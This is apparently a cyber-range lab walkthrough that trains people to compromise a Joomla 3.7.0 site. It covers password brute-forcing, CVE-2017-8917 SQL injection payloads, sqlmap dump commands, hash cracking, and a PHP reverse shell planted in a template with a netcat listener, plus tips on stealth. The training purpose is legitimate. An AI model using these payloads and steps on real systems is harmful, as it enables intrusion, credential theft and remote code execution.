@@ -1,0 +1,274 @@
+Timestamp: 2025-12-24T16:50:05.474440
+URL: https://app.cyberranges.com/instance/start/694bfd99dabdba0ee85a7201
+Title: Loading Scenario - CYBER RANGES
+Hash: 09c2e51e9c68ec72e8a1535b0b2497950180399d5b8b96eba5d7c5c4956b0fab
+================================================================================
+MISSION
+RULES
+LEADERBOARD
+VPN
+JOOMLA HACKING 101
+INTRODUCTION
+
+Joomla's widespread deployment in complex web environments makes it a frequent target for exploitation, requiring specific knowledge of its architecture and vulnerability landscape. Understanding how to identify version-specific flaws and misconfigurations is essential for assessing web server security. In this scenario, you will enumerate Joomla core versions, exploit a known SQL injection vulnerability (CVE-2017-8917), and crack administrative credentials. Using tools such as joomla-brute.py, sqlmap, and John the Ripper, you will move from initial reconnaissance to compromising the administration panel and establishing a reverse shell.
+
+ LAB ACCESS GUIDELINES
+
+To support the completion of this scenario, you are provided with a Kali VM that can be used for receiving reverse connections.
+
+Browser-based access is provided via the web service for GUI.
+
+VM
+
+	
+
+IP
+
+	
+
+Username
+
+	
+
+Password
+
+
+
+
+Kali
+
+	
+
+192.168.125.200
+
+	
+
+rangeadmin
+
+	
+
+password_CR1
+
+For VPN access steps see the Rules section.
+
+PHASE 1: RECONNAISSANCE & ENUMERATION
+Joomla Architecture & Attack Surface
+
+Identifying specific Joomla configuration and core files is necessary to map the attack surface. These files often reveal version information, database credentials, and directory structures that determine which specific exploits are viable.
+
+Critical Configuration Files
+Identification of these files is essential for post-compromise looting and configuration analysis:
+
+configuration.php: Database credentials and secrets.
+
+.htaccess: Access control and rewrite rules (often reveals mitigation attempts).
+
+xmlrpc.php: Vector for brute-force and amplification attacks.
+
+Standard Entry Points
+Default locations for administrative access and directory indexing:
+
+Backend Login: /administrator
+
+Frontend Login: /index.php?option=com_users&view=login
+
+Directory Indexing: /administrator/components/com_content/
+
+	
+
+Key: Target URL
+
+The target URL for this scenario is: http://192.168.125.100:8080
+
+Let's begin by copy-pasting the target URL to the Firefox browser. The website appears as shown below:
+
+First, we will review some paths that can give us version details:
+
+/administrator/manifests/files/joomla.xml -> core Joomla version
+
+/language/en-GB/en-GB.xml -> Gives core Joomla version
+
+/README.txt -> Gives the version of Joomla core
+
+We will use the following path to find the version of Joomla Core:
+
+http://192.168.125.100:8080/language/en-GB/en-GB.xml
+
+The output (as shown below) states that the version of Joomla core is 3.7.0.
+
+	
+
+Reflection Point: Reconnaissance Strategy
+
+We relied on /language/en-GB/en-GB.xml to identify the core version. If the administrator had removed or secured these default XML manifest files, what other passive or active techniques could you use to fingerprint the Joomla version?
+
+Model Answer: You could analyze the HTML source code for meta generator tags (if not disabled), examine the unique hashes of static assets (images/CSS) that change between versions (file fingerprinting), or analyze the specific HTTP responses/behaviors of default components known to exist in certain versions.
+
+User Enumeration & Brute-Force
+
+Understanding Joomla's permission hierarchy helps identify high-value targets for credential attacks. Compromising a Super User or Administrator account is typically required to modify templates or execute code on the server, whereas lower-level accounts may only offer content access.
+
+Super-user: Complete administrative access.
+
+Administrator: Manage users and content, but with restricted configuration access.
+
+Manager: Content creation and backend system info.
+
+User: Post articles.
+
+	
+
+Easy to Confuse: Permissions vs. Access
+
+It is easy to confuse 'Administrator' with 'Super User.' In Joomla, an Administrator can manage users and content but often lacks the ability to modify global configurations or edit template files (PHP), which is required for the RCE phase of this scenario. Only Super Users typically have the 'Text Filters' permission needed to save PHP code.
+
+Having identified the core Joomla version, the next phase involves identifying valid user accounts to expand access beyond the public interface. We will use a custom Python script to enumerate potential credentials.
+
+Navigate to Documents/Tools/ and run the command below:
+
+python3 joomla-brute.py -u http://192.168.125.100:8080/ -w ~/Documents/listpass/passwords.txt -usr admin
+
+If the tool freezes, press Ctrl+C and change the -usr option from admin to manager as illustrated below:
+
+python3 joomla-brute.py -u http://192.168.125.100:8080/ -w ~/Documents/listpass/passwords.txt -usr manager
+
+Great! We have found credentials for the user manager. Log in using the credentials acquired above after accessing the URL: http://192.168.125.100:8080/administrator
+
+PHASE 2: EXPLOITATION (SQL INJECTION)
+
+Since the 'manager' account lacks the administrative privileges required for further exploitation, we must leverage the discovered version vulnerability to bypass authentication controls entirely.
+
+Version 3.7.0 contains a critical vulnerability in the core SQL query structure (CVE-2017-8917). This flaw allows unauthenticated attackers to manipulate database queries and extract sensitive user data without valid credentials.
+
+Step 1: Vulnerability Validation (Manual)
+
+We can attempt to exploit it using the payload below:
+
+http://192.168.125.100:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+
+We get an error on the page which seems to be an SQL Injection error.
+
+Next, we attempt to extract the user:
+
+http://192.168.125.100:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)
+
+Change user() parameter to database() to find the database name:
+
+http://192.168.125.100:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,database()),1)
+
+We got the name of the database which is joomla.
+
+	
+
+Reflection Point: Automation vs. Stealth
+
+We manually validated the injection with updatexml before deploying sqlmap with high risk/level flags. Why is this manual verification step particularly critical before using aggressive automation tools in a production environment?
+
+Model Answer: Automated tools like SQLMap can generate thousands of requests, potentially triggering Intrusion Detection Systems (IDS), locking accounts, or crashing the database service if aggressive fuzzing is used. Manual validation confirms the specific vector, allowing the attacker to configure the tool for a targeted, quieter extraction (OPSEC).
+
+Step 2: Automated Extraction (SQLMap)
+
+We'll utilize sqlmap to attack the joomla database using the following payload:
+
+	
+
+Watch out for this: Risk Levels
+
+Using --risk=3 and --level=5 significantly increases the payload intensity. While necessary in this lab environment to bypass specific filters, executing high-risk SQL injection tests in a production environment can result in UPDATE or DELETE vectors that may corrupt data or crash the database service.
+
+sqlmap -u "http://192.168.125.100:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables --dump -p list[fullordering]
+
+sqlmap managed to discover the version of the back-end database and the table name #__users as shown below:
+
+Since we know the table name of the users let's add it to our payload as illustrated below:
+
+sqlmap -u "http://192.168.125.100:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password --dump -p list[fullordering]
+Step 3: Offline Cracking
+
+The database dump provided hashed credentials which cannot be used directly for login. To utilize these credentials for administrative access, the hashes must be cracked into plaintext using John the Ripper.
+
+Create file named password.hash
+
+nano password.hash
+
+	
+
+Watch out for this: Hash Format
+
+Ensure the hash format in password.hash strictly follows the username:hash syntax. John the Ripper often requires the username field to properly apply rules or identify the hash type context. Missing the colon or the username can result in a 'No password hashes loaded' error.
+
+Copy the admin hash and paste it into the password.hash file using the below format
+
+admin:hash
+
+admin:$2y$10$hNe52nAsL5rWJuPjyQhLuObyxNOTe2DlXwhGQPu8Yq6VGt1DucoKW
+
+Crack the hash using John:
+
+john --crack-status password.hash
+
+	
+
+Reflection Point: Credential Hierarchy
+
+You successfully compromised the 'manager' account but still needed to perform SQL injection to gain full control. In a real-world engagement, if the SQL injection vulnerability did not exist, how could the 'manager' access be leveraged to further the attack chain?
+
+Model Answer: A 'manager' account provides authenticated access to the backend structure. This could be used to identify installed plugins with known vulnerabilities that are not visible to unauthenticated users, view internal content for social engineering data, or test for logic flaws and broken access controls that might allow privilege escalation.
+
+PHASE 3: POST-EXPLOITATION (RCE)
+
+With administrative access confirmed, the final objective is to transition from web access to a system-level shell by injecting a payload into the template system.
+
+Navigate to the login URL below and utilize the acquired password to perform user authentication.
+
+http://192.168.125.100:8080/administrator
+
+Let's go to Extensions-> Templates -> Templates. Click on the Protostar Details and Files template.
+
+Navigate to the error.php file to upload the malicious PHP code.
+
+	
+
+Key: PHP Code
+
+The php reverse shell code has been provided in the desktop directory with the name revshell.php. Copy the code from this file.
+
+	
+
+Watch out for this: IP Configuration
+
+Verify that the IP address in the PHP reverse shell matches your local Kali VPN IP (192.168.125.200), not the target machine's IP. Additionally, ensure your Netcat listener is active before navigating to the template URL; otherwise, the execution will hang or fail silently.
+
+Paste the PHP code in the error.php file and change the IP to our Kali IP. Let the port remain as it is and click the Save & Close button.
+
+Now it's uploaded. Before we trigger the reverse php shell, we should open the Netcat listener.
+
+nc -lvp 1234
+
+Trigger the uploaded PHP reverse shell by visiting the path where the error.php file is saved on a new tab: http://192.168.125.100:8080/templates/protostar/error.php
+
+Navigate to the running Netcat session and run the commands below to confirm you have gained a reverse shell:
+
+id
+whoami
+ls
+
+We successfully managed to exploit the vulnerable Joomla template and managed to get an interactive reverse shell.
+
+	
+
+Reflection Point: Post-Exploitation Tactics
+
+We chose to inject the reverse shell into error.php rather than the main index.php or a specific article template. From a persistence and stealth perspective, what are the advantages and disadvantages of using the error handling template for RCE?
+
+Model Answer: Advantage: It is stealthier because the code does not execute on every page load, reducing noise and the risk of breaking the site's main functionality. Disadvantage: It requires a specific trigger (generating an error) to activate the shell, and if a legitimate error occurs while an admin is investigating logs, the sudden outbound connection might be detected.
+
+CONCLUSION
+
+By systematically chaining reconnaissance, specific vulnerability exploitation, and post-authentication code execution, you have successfully demonstrated the full compromise of a Joomla CMS. This scenario highlighted how version-specific flaws (CVE-2017-8917) can bypass authentication mechanisms, and how legitimate administrative features—such as template editing—can be weaponized to achieve Remote Code Execution (RCE). Understanding this attack path is critical for auditing CMS deployments and validating the effectiveness of patch management and input sanitization controls.
+
+Joomla Hacking 101
+By Franko Janku
+Loading...
+Loading 1%
+3m 42s left
